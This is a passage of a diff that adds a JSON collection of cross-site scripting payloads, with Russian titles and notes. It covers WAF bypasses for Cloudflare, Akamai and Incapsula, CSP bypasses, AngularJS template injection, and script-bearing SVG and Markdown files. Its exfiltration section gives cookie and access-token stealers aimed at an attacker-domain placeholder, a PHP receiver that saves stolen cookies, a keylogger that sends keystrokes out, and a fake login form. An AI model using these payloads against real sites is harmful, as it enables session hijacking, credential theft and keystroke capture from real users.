[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()",
+      "meta": "Полностью из символов []()!+ — http://www.jsfuck.com/."
+    },
+
+    {
+      "subcategory": "Обход WAF",
+      "title": "Cloudflare",
+      "language": "html",
+      "tags": ["waf-bypass", "cloudflare"],
+      "body": "<svg/onrandom=random onload=confirm(1)>\n<video onnull=null onmouseover=confirm(1)>\n<svg/OnLoad=\"`${prompt``}`\">\n<svg/onload=%26nbsp;alert`bohdan`+\n1'\"><img/src/onerror=.1|alert``>\n<svg onload=prompt%26%230000000040document.domain)>\n<svg onload=prompt%26%23x000000028;document.domain)>\nxss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>\n<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f\n<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>",
+      "meta": "Подборка байпасов Cloudflare (2018–2021), в основном от @bohdansec."
+    },
+    {
+      "subcategory": "Обход WAF",
+      "title": "Incapsula WAF",
+      "language": "html",
+      "tags": ["waf-bypass", "incapsula"],
+      "body": "<svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");>\nanythinglr00</script><script>alert(document.domain)</script>uxldz\nanythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz\n<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>"
+    },
+    {
+      "subcategory": "Обход WAF",
+      "title": "Akamai WAF",
+      "language": "html",
+      "tags": ["waf-bypass", "akamai"],
+      "body": "?\"></script><base%20c%3D=href%3Dhttps:\\mysite>\n<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>"
+    },
+    {
+      "subcategory": "Обход WAF",
+      "title": "WordFence WAF",
+      "language": "html",
+      "tags": ["waf-bypass", "wordfence"],
+      "body": "<a href=javas&#99;ript:alert(1)>"
+    },
+    {
+      "subcategory": "Обход WAF",
+      "title": "Fortiweb / Chrome Auditor",
+      "language": "html",
+      "tags": ["waf-bypass", "fortiweb"],
+      "body": "\\u003e\\u003c\\u0068\\u0031 onclick=alert('1')\\u003e\n</script><svg><script>alert(1)-%26apos%3B",
+      "meta": "Первый — Fortiweb (@rezaduty); второй — устаревший Chrome XSS Auditor."
+    },
+
+    {
+      "subcategory": "Обход CSP",
+      "title": "Тулзы для CSP",
+      "language": "text",
+      "tags": ["csp", "tools"],
+      "body": "csp-evaluator.withgoogle.com — проверка, насколько CSP сильна против XSS.\ngmsgadget.com (GMSGadget) — коллекция JS-гаджетов для обхода CSP и санитайзеров (DOMPurify).\nJSONBee/jsonp.txt — готовые JSONP-эндпоинты для байпаса."
+    },
+    {
+      "subcategory": "Обход CSP",
+      "title": "Обход CSP через JSONP",
+      "language": "html",
+      "tags": ["csp", "jsonp", "bypass"],
+      "body": "<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>\"",
+      "meta": "Если в whitelist есть google.com/youtube.com — используем их JSONP-callback. Примеры: //google.com/complete/search?client=chrome&jsonp=alert(1); https://accounts.google.com/o/oauth2/revoke?callback=alert(1337); https://www.youtube.com/oembed?callback=alert;"
+    },
+    {
+      "subcategory": "Обход CSP",
+      "title": "Обход CSP default-src (iframe + appendChild)",
+      "language": "javascript",
+      "tags": ["csp", "default-src", "bypass"],
+      "body": "script=document.createElement('script');\nscript.src='//[ATTACKER.DOMAIN.TLD]/csp.js';\nwindow.frames[0].document.head.appendChild(script);",
+      "meta": "Для CSP default-src 'self' 'unsafe-inline'. Создаём iframe с same-origin документом и в его head добавляем внешний script. Источник: lab.wallarm.com."
+    },
+    {
+      "subcategory": "Обход CSP",
+      "title": "Обход CSP inline/eval (CSS-link → iframe)",
+      "language": "javascript",
+      "tags": ["csp", "eval", "bypass"],
+      "body": "d=document;f=d.createElement(\"iframe\");f.src=d.querySelector('link[href*=\".css\"]').href;d.body.append(f);s=d.createElement(\"script\");s.src=\"https://[ATTACKER.DOMAIN.TLD]\";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)",
+      "meta": "Источник: Rhynorater."
+    },
+    {
+      "subcategory": "Обход CSP",
+      "title": "Обход CSP script-src 'self' (object + data:)",
+      "language": "html",
+      "tags": ["csp", "script-src", "data-scheme"],
+      "body": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
+      "meta": "base64 = <script>alert(1)</script>. Источник: @akita_zen."
+    },
+    {
+      "subcategory": "Обход CSP",
+      "title": "Обход CSP script-src data:",
+      "language": "html",
+      "tags": ["csp", "script-src", "data-scheme"],
+      "body": "<script src=\"data:,alert(1)\">/</script>",
+      "meta": "Для CSP script-src 'self' data: — как предупреждает документация Mozilla."
+    },
+    {
+      "subcategory": "Обход CSP",
+      "title": "Обход CSP unsafe-inline",
+      "language": "html",
+      "tags": ["csp", "unsafe-inline"],
+      "body": "\"/><script>alert(1);</script>",
+      "meta": "Для script-src ... 'unsafe-inline' — инлайн-скрипты разрешены."
+    },
+    {
+      "subcategory": "Обход CSP",
+      "title": "Обход CSP nonce (инъекция <base>)",
+      "language": "html",
+      "tags": ["csp", "nonce", "base-tag"],
+      "body": "<base href=http://[ATTACKER.DOMAIN.TLD]>",
+      "meta": "Если есть script с относительным путём <script src='/PATH.js'> — тег <base> перенаправит его загрузку на твой сервер (хости свой /PATH.js по тому же пути)."
+    },
+    {
+      "subcategory": "Обход CSP",
+      "title": "Обход CSP, отправленного через PHP header()",
+      "language": "text",
+      "tags": ["csp", "php", "bypass"],
+      "body": "GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a",
+      "meta": "В php:apache PHP не может выставить заголовок CSP, если данные ответа уже начали писаться. Сгенерируй Warning (>1000 GET/POST-параметров или 20 $_FILES) → 'headers already sent' → CSP не применится. Источник: @pilvar222."
+    },
+
+    {
+      "subcategory": "Angular / CSTI",
+      "title": "AngularJS 1.6+ — базовый CSTI",
+      "language": "javascript",
+      "tags": ["angular", "csti"],
+      "body": "{{constructor.constructor('alert(1)')()}}",
+      "meta": "Требуется директива ng-app в корневом элементе. С версии 1.6 AngularJS убрал sandbox. Работает также для AngularJS 1.0.1–1.1.5 и Vue JS."
+    },
+    {
+      "subcategory": "Angular / CSTI",
+      "title": "AngularJS 1.6.0 — варианты constructor",
+      "language": "javascript",
+      "tags": ["angular", "csti"],
+      "body": "{{0[a='constructor'][a]('alert(1)')()}}\n{{$eval.constructor('alert(1)')()}}\n{{$on.constructor('alert(1)')()}}",
+      "meta": "От @LewisArdern и @garethheyes."
+    },
+    {
+      "subcategory": "Angular / CSTI",
+      "title": "AngularJS — обход без кавычек",
+      "language": "javascript",
+      "tags": ["angular", "csti", "no-quotes"],
+      "body": "{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}",
+      "meta": "Без одинарных и двойных кавычек, от @Viren. fromCharCode(97,108,...) = alert(1)."
+    },
+    {
+      "subcategory": "Angular / CSTI",
+      "title": "AngularJS — обход без кавычек и слова constructor",
+      "language": "javascript",
+      "tags": ["angular", "csti", "bypass"],
+      "body": "{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}",
+      "meta": "a = 767015343..toString(36)+50986827..toString(36) = 'constructor'. Полезная нагрузка = prompt(document.domain)."
+    },
+    {
+      "subcategory": "Angular / CSTI",
+      "title": "AngularJS — обход WAF Imperva",
+      "language": "javascript",
+      "tags": ["angular", "csti", "waf-bypass"],
+      "body": "{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\\\u{6f}mpt(d\\\\u{6f}cument.d\\\\u{6f}main)')()}}"
+    },
+    {
+      "subcategory": "Angular / CSTI",
+      "title": "AngularJS — Blind XSS (загрузка внешнего скрипта)",
+      "language": "javascript",
+      "tags": ["angular", "csti", "blind"],
+      "body": "{{\n    $on.constructor(\"var _ = document.createElement('script');\n    _.src='//localhost/m';\n    document.getElementsByTagName('body')[0].appendChild(_)\")()\n}}",
+      "meta": "Для 1.0.1–1.1.5 и >1.6.0 (Lewis Ardern, Gareth Heyes). Подгружает //localhost/m. Старый вариант через constructor.constructor вместо $on.constructor."
+    },
+    {
+      "subcategory": "Angular / CSTI",
+      "title": "Angular — обход санитайзера (bypassSecurityTrust*)",
+      "language": "text",
+      "tags": ["angular", "sanitizer", "code-review"],
+      "body": "bypassSecurityTrustHtml\nbypassSecurityTrustScript\nbypassSecurityTrustStyle\nbypassSecurityTrustUrl\nbypassSecurityTrustResourceUrl",
+      "meta": "Angular по умолчанию санитизирует значения. Эти методы DomSanitizer помечают значение как доверенное и отключают санитизацию. При код-ревью убедись, что в них не попадает пользовательский ввод — иначе XSS (напр. bypassSecurityTrustUrl('javascript:alert(\"Hi there\")'))."
+    },
+
+    {
+      "subcategory": "Файлы: SVG / XML / MathML",
+      "title": "XSS в XML (CDATA)",
+      "language": "html",
+      "tags": ["xml", "file", "cdata"],
+      "body": "<name>\n  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>\n</name>",
+      "meta": "Секция CDATA нужна, чтобы JS-payload не интерпретировался как XML-разметка."
+    },
+    {
+      "subcategory": "Файлы: SVG / XML / MathML",
+      "title": "XSS в XHTML (xmlns)",
+      "language": "html",
+      "tags": ["xml", "xhtml", "file"],
+      "body": "<html>\n<head></head>\n<body>\n<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>\n</body>\n</html>"
+    },
+    {
+      "subcategory": "Файлы: SVG / XML / MathML",
+      "title": "XSS в SVG — простой (green triangle)",
+      "language": "html",
+      "tags": ["svg", "file"],
+      "body": "<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n  <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>\n  <script type=\"text/javascript\">\n    alert(document.domain);\n  </script>\n</svg>",
+      "meta": "Загрузи как .svg файл — при открытии в браузере исполнится скрипт."
+    },
+    {
+      "subcategory": "Файлы: SVG / XML / MathML",
+      "title": "XSS в SVG — все векторы (red lightning)",
+      "language": "html",
+      "tags": ["svg", "file", "comprehensive"],
+      "body": "<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n\n<svg version=\"1.1\" baseProfile=\"full\" width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('svg attribut')\">\n  <polygon id=\"lightning\" points=\"0,100 50,25 50,75 100,0\" fill=\"#ff1919\" stroke=\"#ff0000\"/>\n  <desc><script>alert('svg desc')</script></desc>\n  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>\n  <foreignObject width=\"500\" height=\"500\">\n    <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert('svg foreignObject iframe');\" width=\"400\" height=\"250\"/>\n  </foreignObject>\n  <title><script>alert('svg title')</script></title>\n  <animatetransform onbegin=\"alert('svg animatetransform onbegin')\"></animatetransform>\n  <script type=\"text/javascript\">\n    alert('svg script');\n  </script>\n</svg>",
+      "meta": "Векторы: атрибут svg onload, desc/foreignObject/title script, foreignObject iframe, animatetransform onbegin. Автор: noraj."
+    },
+    {
+      "subcategory": "Файлы: SVG / XML / MathML",
+      "title": "Короткие SVG payload-ы",
+      "language": "html",
+      "tags": ["svg", "short"],
+      "body": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n\n<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>\n<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>\n<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>"
+    },
+    {
+      "subcategory": "Файлы: SVG / XML / MathML",
+      "title": "Вложенные SVG (sub-SVG, french flag)",
+      "language": "html",
+      "tags": ["svg", "nested", "file"],
+      "body": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <svg x=\"10\">\n    <rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #002654\"/>\n    <script type=\"text/javascript\">alert('sub-svg 1');</script>\n  </svg>\n  <svg x=\"200\">\n    <rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #ED2939\"/>\n    <script type=\"text/javascript\">alert('sub-svg 2');</script>\n  </svg>\n</svg>",
+      "meta": "Подключение удалённого SVG через xlink:href НЕ триггерит вложенный XSS; а вот вложение <svg> внутрь SVG-документа исполняет XSS из суб-SVG. Автор: noraj."
+    },
+    {
+      "subcategory": "Файлы: SVG / XML / MathML",
+      "title": "XSS в Markdown",
+      "language": "text",
+      "tags": ["markdown", "file"],
+      "body": "[a](javascript:prompt(document.cookie))\n[a](j a v a s c r i p t:prompt(document.cookie))\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[a](javascript:window.onerror=alert;throw%201)"
+    },
+    {
+      "subcategory": "Файлы: SVG / XML / MathML",
+      "title": "XSS в CSS (разрыв </style>)",
+      "language": "html",
+      "tags": ["css", "file", "style-breakout"],
+      "body": "<!DOCTYPE html>\n<html>\n<head>\n<style>\ndiv  {\n    background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(document.domain)>\");\n    background-color: #cccccc;\n}\n</style>\n</head>\n  <body>\n    <div>lol</div>\n  </body>\n</html>",
+      "meta": "Литерал </style> внутри значения CSS закрывает блок стилей и позволяет вставить <svg onload>."
+    },
+
+    {
+      "subcategory": "PostMessage",
+      "title": "XSS через postMessage (targetOrigin *)",
+      "language": "html",
+      "tags": ["postmessage", "dom"],
+      "body": "<html>\n<body>\n    <input type=button value=\"Click Me\" id=\"btn\">\n</body>\n\n<script>\ndocument.getElementById('btn').onclick = function(e){\n    window.poc = window.open('http://10.10.10.10/#login');\n    setTimeout(function(){\n        window.poc.postMessage(\n            {\n                \"sender\": \"accounts\",\n                \"url\": \"javascript:confirm('XSS')\",\n            },\n            '*'\n        );\n    }, 2000);\n}\n</script>\n</html>",
+      "meta": "Если целевой origin = '*', сообщение можно отправить любому домену, у которого есть ссылка на дочернюю страницу. Уязвимый листенер, доверяющий url из сообщения, исполнит javascript:."
+    },
+
+    {
+      "subcategory": "Blind XSS",
+      "title": "Blind XSS — подгрузка внешнего скрипта",
+      "language": "html",
+      "tags": ["blind", "xss-hunter"],
+      "body": "\"><script src=\"https://js.rip/[ATTACKER.DOMAIN.TLD]\"></script>\n\"><script src=//[ATTACKER.DOMAIN.TLD]></script>\n<script>$.getScript(\"//[ATTACKER.DOMAIN.TLD]\")</script>",
+      "meta": "XSS Hunter (xsshunter.com) устарел; есть self-hosted (mandatoryprogrammer/xsshunter-express) и xsshunter.trufflesecurity.com. Другие тулзы: sleepy-puppy, bXSS, ezXSS."
+    },
+    {
+      "subcategory": "Blind XSS",
+      "title": "Blind XSS — где искать и быстрая проверка",
+      "language": "html",
+      "tags": ["blind", "recon", "methodology"],
+      "body": "<script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>",
+      "meta": "Точки внедрения: контактные формы, тикет-саппорт, заголовки Referer/User-Agent (логи и аналитика админки), комментарии. Перед запуском тяжёлой blind-XSS тулзы подтверди срабатывание простым грабером + однострочным HTTP-сервером: ruby -run -ehttpd . -p8080"
+    },
+
+    {
+      "subcategory": "Эксфильтрация / PoC",
+      "title": "Кража cookie / токена (Data Grabber)",
+      "language": "html",
+      "tags": ["cookie-stealing", "exfil", "poc"],
+      "body": "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>\n<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>\n<script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script>\n<script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script>",
+      "meta": "Отправляет cookie/access_token админа на контролируемую страницу. Вариант через new Image() работает скрытно (без редиректа)."
+    },
+    {
+      "subcategory": "Эксфильтрация / PoC",
+      "title": "Серверный приёмник cookie (PHP grabber)",
+      "language": "text",
+      "tags": ["cookie-stealing", "exfil", "php"],
+      "body": "<?php\n$cookie = $_GET['c'];\n$fp = fopen('cookies.txt', 'a+');\nfwrite($fp, 'Cookie:' .$cookie.\"\\r\\n\");\nfclose($fp);\n?>",
+      "meta": "grabber.php — пишет полученные cookie в файл cookies.txt."
+    },
+    {
+      "subcategory": "Эксфильтрация / PoC",
+      "title": "Эксфильтрация через CORS fetch",
+      "language": "html",
+      "tags": ["exfil", "cors", "fetch"],
+      "body": "<script>\n  fetch('https://[ATTACKER.DOMAIN.TLD]', {\n  method: 'POST',\n  mode: 'no-cors',\n  body: document.cookie\n  });\n</script>"
+    },
+    {
+      "subcategory": "Эксфильтрация / PoC",
+      "title": "JavaScript-кейлоггер",
+      "language": "html",
+      "tags": ["keylogger", "exfil", "poc"],
+      "body": "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://[ATTACKER.DOMAIN.TLD]/?k=\"+String.fromCharCode(e.which))},this.remove();'>",
+      "meta": "Перехватывает нажатия клавиш и шлёт их на сервер атакующего."
+    },
+    {
+      "subcategory": "Эксфильтрация / PoC",
+      "title": "UI Redressing — фейковая форма логина",
+      "language": "html",
+      "tags": ["ui-redressing", "phishing", "poc"],
+      "body": "<script>\nhistory.replaceState(null, null, '../../../login');\ndocument.body.innerHTML = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>\"\n</script>",
+      "meta": "Через XSS подменяет содержимое страницы фейковой формой логина (плюс правит URL через history.replaceState)."
+    },
+
+    {
+      "subcategory": "Mutation XSS",
+      "title": "Mutation XSS (mXSS, DOMPurify bypass)",
+      "language": "html",
+      "tags": ["mxss", "mutation", "dompurify"],
+      "body": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+      "meta": "Использует квирки браузера для пересборки HTML-тегов через innerHTML-мутации. Пример Masato Kinugawa против cure53/DOMPurify на Google Search."
+    }
+  ]
+}
